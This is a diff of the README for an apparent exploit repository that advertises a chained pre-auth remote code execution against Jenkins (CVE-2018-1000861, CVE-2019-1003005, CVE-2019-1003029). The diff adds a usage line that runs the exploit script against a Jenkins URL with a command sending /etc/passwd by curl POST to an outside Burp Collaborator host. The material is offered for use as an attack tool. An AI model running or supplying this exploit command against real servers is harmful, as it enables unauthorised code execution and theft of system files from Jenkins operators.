@@ -1,5 +1,8 @@
 # awesome-jenkins-rce-2019
 
+python exp.py https://admin.com/jenkins/ 'curl -X POST -d @/etc/passwd ttqjdy7l0qfdohel7j20aws1zs5it7.burpcollaborator.net'
+
+
 There is no pre-auth RCE in Jenkins since May 2017, but this is the one!
 
 It chains CVE-2018-1000861, CVE-2019-1003005 and CVE-2019-1003029 to a more reliable and elegant pre-auth remote code execution!
